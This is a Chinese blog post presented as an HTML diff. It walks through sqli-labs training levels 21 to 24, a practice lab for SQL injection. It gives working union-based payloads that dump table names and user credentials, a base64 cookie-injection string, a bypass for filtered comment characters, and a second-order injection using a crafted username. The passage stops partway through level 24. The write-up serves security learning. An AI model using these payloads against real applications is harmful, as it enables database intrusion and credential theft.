@@ -1,0 +1,1784 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#00FFFF">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#00FFFF">
+
+
+
+
+
+  <meta name="keywords" content="sqli_labs," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="从page 2开始主要是各种过滤与限制条件">
+<meta name="keywords" content="sqli_labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs21-37">
+<meta property="og:url" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;index.html">
+<meta property="og:site_name" content="CyzCc&#39;s blog">
+<meta property="og:description" content="从page 2开始主要是各种过滤与限制条件">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;9.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;10.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;11.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;12.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;13.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;14.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;15.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;16.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;17.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;18.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;19.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;20.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;21.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;22.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;23.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;24.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;Users&#x2F;%E5%8D%8E%E7%A1%95&#x2F;Desktop&#x2F;%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;Users&#x2F;%E5%8D%8E%E7%A1%95&#x2F;Desktop&#x2F;%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;Users&#x2F;%E5%8D%8E%E7%A1%95&#x2F;Desktop&#x2F;%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;Users&#x2F;%E5%8D%8E%E7%A1%95&#x2F;Desktop&#x2F;%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;Users&#x2F;%E5%8D%8E%E7%A1%95&#x2F;Desktop&#x2F;%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;Users&#x2F;%E5%8D%8E%E7%A1%95&#x2F;Desktop&#x2F;%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;Users&#x2F;%E5%8D%8E%E7%A1%95&#x2F;Desktop&#x2F;%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">
+<meta property="og:updated_time" content="2020-04-17T01:16:23.475Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;17&#x2F;sqli_labs21-37&#x2F;1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://cyzcc.vip/2020/03/17/sqli_labs21-37/"/>
+
+
+
+
+<!--留言-->
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "9e261f4f"
+    });
+  daovoice('update');
+  </script>
+
+
+  <title>sqli-labs21-37 | CyzCc's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CyzCc's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">♫日常学习笔记整理♬♬</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页|随笔">
+          <a href="/home/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            主页|随笔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-一些知识点">
+          <a href="/guestbook/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-comments"></i> <br />
+            
+            一些知识点
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cyzcc.vip/2020/03/17/sqli_labs21-37/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CyzCc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CyzCc's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-labs21-37</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-17T22:16:42+08:00">
+                2020-03-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/03/17/sqli_labs21-37/" class="leancloud_visitors" data-flag-title="sqli-labs21-37">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4.8k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  20
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>从page 2开始主要是各种过滤与限制条件<a id="more"></a></p>
+<h1 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h1><p>POST – cookie 注入 – base64 编码</p>
+<p>一套测试过后，并没有什么发现，也没有回显，然后我们使用admin    admin登录进去看一下，发现显示了cookie，并且uname被base64 加密<br><img src="/2020/03/17/sqli_labs21-37/1.png" alt><br>然后尝试在cookie出进行注入，将注入语句进行base64加密<br>先测试闭合，发现是1‘) or 1=1#单引号加括号闭合</p>
+<p><img src="/2020/03/17/sqli_labs21-37/2.png" alt></p>
+<p>然后就可以像20关一样进行联合查询,这里就直接查询结果了</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line"><span class="number">1</span><span class="string">') union select 1,2,database()#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆表</span></span><br><span class="line"><span class="string">1'</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">security</span><span class="string">'#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆列</span></span><br><span class="line"><span class="string">1'</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> <span class="built_in">table_name</span>=<span class="string">'users'</span>#</span><br><span class="line"></span><br><span class="line">内容：</span><br><span class="line"><span class="number">1</span><span class="string">') union select 1,2,group_concat(username,password) from users#</span></span><br><span class="line"><span class="string">MScpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHVzZXJzIw==</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/17/sqli_labs21-37/3.png" alt></p>
+<h1 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h1><p>POST – cookie 注入 – base64 编码<br>这一关是双引号闭合，将上一关的 ‘) 改为 “ 即可</p>
+<h1 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h1><p>从这一关开始，又是get型了，终于不用抓包了。Page 2 主要是各种过滤与限制条件。<br>开始测试注入类型</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1	不报错</span><br><span class="line">id=1'	报错</span><br><span class="line">id=1<span class="string">"	不报错</span></span><br></pre></td></tr></table></figure>
+
+<p>所以是单引号闭合的查询,但是不管怎样都不能闭合，查看源码</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$re</span>g = <span class="string">"/#/"</span>;</span><br><span class="line"><span class="symbol">$re</span>g1 = <span class="string">"/--/"</span>;</span><br><span class="line"><span class="symbol">$repla</span>ce = <span class="string">""</span>;</span><br><span class="line"><span class="symbol">$i</span>d = preg_replace(<span class="symbol">$re</span>g, <span class="symbol">$repla</span>ce, <span class="symbol">$i</span>d);</span><br><span class="line"><span class="symbol">$i</span>d = preg_replace(<span class="symbol">$re</span>g1, <span class="symbol">$repla</span>ce, <span class="symbol">$i</span>d);</span><br></pre></td></tr></table></figure>
+
+<p>原来是将#  – 等字符过滤了，但是将其url编码号任然不行<br>查案执行的SQL语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>
+
+<p>这种怎么办？思路有两个：1、用别的注释符 2、用其他方法替代注释符 注释符还有一个/<em><em>/但它用来注释星号之间的东西：/\</em>被注释的部分\</em>/ 采用第二个思路，用其他语句替代注释符，如何去闭合 SQL 语句呢–逻辑运算符<br>我们可以使用 or 或 and 尝试构造额外的逻辑运算。<br>构造如下语句<br><code>Id=1&#39; and 1=1 or&#39;</code> 将它放到 SQL 语句中就是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span>*FROMusersWHERE <span class="keyword">id</span>=<span class="string">'1'</span><span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">or</span><span class="string">''</span>LIMIT0,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就闭合了引号不存在语法错误，且其逻辑结果在我们的控制范围内。<br>那么用 and 呢？ </p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>' and <span class="number">1</span>=<span class="number">1</span> and '<span class="number">1</span> 因为要保证 and <span class="number">1</span>=<span class="number">1</span> 使我们可控的部分，所以要保证后面的逻辑为正，不为 <span class="number">0</span></span><br><span class="line">id=<span class="number">1</span>' and <span class="number">1</span>=<span class="number">1</span> or' 返回正常 </span><br><span class="line">id=<span class="number">1</span>' and <span class="number">1</span> = <span class="number">2</span> or' 返回错误</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/17/sqli_labs21-37/4.png" alt></p>
+<p>然后查询字段但是order by并不能正常查询，原因：</p>
+<p><code>where</code>与<code>order by</code>是子句，<code>and</code>是操作符，用于<code>where</code>子句。<br> 在MySQL的执行顺序中，<code>where</code>是远在<code>order by</code>前面的。</p>
+<p>在第一个查询语句中，<code>id=&#39;1&#39; and &#39;1&#39;=&#39;1&#39;</code>作为<code>where</code>的条件，先被执行，得到结果集；然后是<code>order by</code>，因结果集中无第四个字段所以报错。</p>
+<p>在第二个查询语句中，<code>order by</code>在<code>where</code>的条件中，在<code>where</code>执行时被忽略了，结果集生成后并未再执行order by</p>
+<p>所以这关不能用<code>order by</code>来判断字段数，而要用<code>union</code>：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> or '</span><br></pre></td></tr></table></figure>
+
+<p>这里id=-1，使原查询左边为空，使我们定义的查询结果返回<br><img src="/2020/03/17/sqli_labs21-37/5.png" alt><br>接下来便是正常查询了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">数据库名</span><br><span class="line">id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span> <span class="keyword">or</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">表名</span></span><br><span class="line"><span class="string">id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),<span class="number">4</span> <span class="keyword">or</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">列名</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name=<span class="string">'users'</span>),<span class="number">4</span> <span class="keyword">or</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">内容</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">4</span> <span class="keyword">or</span> <span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/17/sqli_labs21-37/6.png" alt></p>
+<h1 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h1><p>基于存储_POST_单引号_二次注入<br>进去后发现有登陆框，忘记密码，注册用户，修改密码等界面，一时无法判断注入点在哪里，先查看一下源码<br>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'Auth'</span>]))</span><br><span class="line">    header(<span class="string">'Location: logged-in.php'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>login.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">$password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到对<code>username</code>和<code>password</code>都做了过滤，很难注入。</p>
+<p>login_create.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username =  mysql_escape_string($_POST[<span class="string">'username'</span>]);</span><br><span class="line">$pass = mysql_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$re_pass = mysql_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">username</span>=<span class="string">'$username'</span></span><br><span class="line">INSERT INTO<span class="built_in"> users </span>(username,password) values (\<span class="string">"<span class="variable">$username</span>\", \"<span class="variable">$pass</span>\")</span></span><br><span class="line"><span class="string">创建用户前先查询是否已经存在该账号</span></span><br></pre></td></tr></table></figure>
+
+<p>pass_change.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$username = $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">$curr_pass = mysql_real_escape_string($_POST[<span class="string">'current_password'</span>]);</span><br><span class="line">$pass = mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$re_pass = mysql_real_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE<span class="built_in"> users </span><span class="builtin-name">SET</span> <span class="attribute">PASSWORD</span>=<span class="string">'$pass'</span> WHERE <span class="attribute">username</span>=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">'$curr_pass'</span></span><br></pre></td></tr></table></figure>
+
+<p>这里发现从<code>session</code>中获得了当前用户名，且被直接用于更新语句并未做检查。<br> 从根本上来说，插入数据时没有过滤，只是做了转义处理。<br> 若当前用户名中含有注释，便可以修改当前用户名中包含的另一用户的密码。</p>
+<h2 id="二次注入："><a href="#二次注入：" class="headerlink" title="二次注入："></a>二次注入：</h2><p>二次注入也称为存储型注入，就是将可能导致 SQL 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发 SQL 注入。</p>
+<p>二次注入的一般过程：</p>
+<p>1.通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务<br> 端进行处理，提交的数据报文请求中可能包含了构造的 SQL 语句或者命令。<br>2.服务端应用程序会将提交的数据信息进行存储，通常是保存在数据库中，保存的<br> 数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。<br>3.向服务端发送第二个与第一次不相同的请求数据信息。<br>4.服务端接收到提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。<br>5.服务端返回执行的处理结果数据信息，便可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</p>
+<p>注入过程</p>
+<p><strong>步骤1：</strong>确定注入逻辑</p>
+<p>注入点在修改密码处：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE<span class="built_in"> users </span><span class="builtin-name">SET</span> <span class="attribute">PASSWORD</span>=<span class="string">'$pass'</span> WHERE <span class="attribute">username</span>=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">'$curr_pass'</span></span><br></pre></td></tr></table></figure>
+
+<p>要将其变为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">'$pass'</span> <span class="keyword">WHERE</span> username=<span class="string">'$username'</span><span class="comment">-- and password='$curr_pass'</span></span><br></pre></td></tr></table></figure>
+
+<p>且已知注册时未有任何过滤，闭合查询语句为单引号，即在注册用户时构造<code>admin&#39;-- (有空格)</code>或<code>admin&#39;#</code></p>
